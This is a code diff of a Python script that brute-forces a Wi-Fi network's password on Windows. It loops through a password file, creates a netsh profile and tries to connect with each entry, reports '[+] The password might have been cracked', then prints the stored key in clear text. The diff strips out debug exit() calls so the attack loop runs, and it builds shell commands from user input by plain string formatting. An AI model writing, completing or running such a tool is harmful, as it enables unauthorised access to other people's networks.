@@ -6,7 +6,6 @@ from requests.adapters import HTTPAdapter
 from urllib3.util.retry import Retry
 import subprocess
 
-print("TEST")
 
 url = "http://www.python.org"
 timeout = 5
@@ -57,21 +56,18 @@ def createNewConnection(name, SSID, key):
 
 
 def connect(name, SSID):
-    """
     command = "netsh wlan connect name={} ssid={} interface=Wi-Fi ".format(name,SSID)
     os.system(command)
-    """
 
     
-    result = subprocess.run(['netsh', 'wlan', 'connect', f'name="{name}"', f'ssid="{SSID}"', 'interface=Wi-Fi'],
+    """result = subprocess.run(['netsh', 'wlan', 'connect', f'name="{name}"', f'ssid="{SSID}"', 'interface=Wi-Fi'],
                             stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
     print(result.stdout,flush=True)
-    print(result.stderr,flush=True)
+    print(result.stderr,flush=True)"""
 
 
 def displayAvailableNetworks():
     WIFI = "Wi-Fi"
-    print("\n")
     command ="netsh wlan show networks interface=Wi-Fi"
     os.system(command)
     """result = subprocess.run(['netsh', 'wlan', 'show', 'networks', 'interface=Wi-Fi'])
@@ -85,19 +81,21 @@ try:
 
 except (requests.ConnectionError, requests.Timeout) as exception:
     print("[LOADING] Loading program...",flush=True), time.sleep(1)
+    pass
 
 connected = True
 while connected:
     try:
         displayAvailableNetworks()
-        exit()
         WIFI = input("WIFI Name: ")
+        os.system("echo test")
+
         with open("passwords", "r") as f:
             for line in f:
                 words = line.split()
                 if words:
                     print(f"Password: {words[0]}")
-
+                    sys.stdout.flush()
                     createNewConnection(WIFI, WIFI, words[0])
                     connect(WIFI, WIFI)
                     try:
@@ -111,7 +109,6 @@ while connected:
                         connected = False
                         choice = input(
                             f"[+] The password might have been cracked, are you connected to {WIFI} (y/N) ? ")
-                        exit()
                         if choice == "y":
                             print("\n[EXITING] Operation canceled")
                             exit()
@@ -128,12 +125,9 @@ while connected:
             print(f"[LOADING] Searching for {WIFI} network")
             time.sleep(1)
             os.system(f'netsh wlan show profile name="{WIFI}" key=clear')
-            exit()
         elif choice == "n" or "N":
             print("\n[EXITING] Exiting program...")
             time.sleep(2)
-            exit()
 
     except KeyboardInterrupt as e:
         print("\n[[EXITING] Aborting program...")
-        exit()
